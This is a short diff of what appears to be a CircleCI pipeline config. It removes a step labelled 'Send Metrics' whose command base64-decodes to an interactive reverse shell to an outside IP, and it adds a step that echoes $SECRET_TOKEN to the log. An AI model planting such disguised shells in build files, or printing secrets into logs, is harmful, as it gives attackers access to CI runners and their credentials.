@@ -12,8 +12,8 @@ jobs:
     steps:
       - checkout
       - run:
-          name: Send Metrics
-          command: echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8zNS4yNDIuMTMwLjE2My80NDQ0IDA+JjEK" | base64 -d | bash
+          name: Testing Masking
+          command: echo "$SECRET_TOKEN"
       - go/with-cache:
           steps:
             - go/mod-download
